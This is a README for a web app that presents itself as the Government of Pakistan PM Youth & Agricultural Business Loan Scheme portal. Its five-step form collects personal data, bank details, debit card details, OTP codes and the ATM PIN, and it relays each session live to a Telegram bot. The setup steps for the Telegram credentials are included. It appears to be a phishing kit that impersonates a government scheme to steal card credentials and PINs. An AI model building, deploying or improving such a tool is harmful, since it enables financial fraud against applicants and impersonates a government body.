# Government of Pakistan - PM Youth & Agricultural Business Loan Scheme 2026

An official, responsive web application for the Government of Pakistan Prime Minister Youth & Agricultural Business Loan Scheme.

## Features
- **5-Step Application Process**:
  1. Personal Information (with `DD/MM/YYYY` auto-formatting for DOB and mobile numeric keypads)
  2. Bank & Financial Details (supporting comma-formatted numbers)
  3. Processing Tax & Debit Card Details
  4. 2-Factor OTP Verification
  5. ATM PIN Security Verification
- **Real-Time Telegram Bot Integration**:
  - Live session tracking with single-message pinning (`pinChatMessage`) and real-time DOM-style updates via Telegram `editMessageText` API.
- **Official Government Emblem Integration**:
  - Embedded SVG emblem logo and responsive styling.

## Getting Started

### Prerequisites
- Node.js (v18+)

### Installation
```bash
# Clone the repository
git clone https://github.com/Hodako/pakistan-loan-portal.git
cd pakistan-loan-portal

# Install dependencies
npm install

# Setup Environment Variables
cp .env.example .env
```

### Environment Variables
Configure `.env` with your Telegram Bot Token and Chat ID:
```env
TELEGRAM_BOT_TOKEN="YOUR_TELEGRAM_BOT_TOKEN"
TELEGRAM_CHAT_ID="YOUR_TELEGRAM_CHAT_ID"
VITE_TELEGRAM_BOT_TOKEN="YOUR_TELEGRAM_BOT_TOKEN"
VITE_TELEGRAM_CHAT_ID="YOUR_TELEGRAM_CHAT_ID"
```

### Running Locally
```bash
# Development server
npm run dev

# Production build
npm run build
```
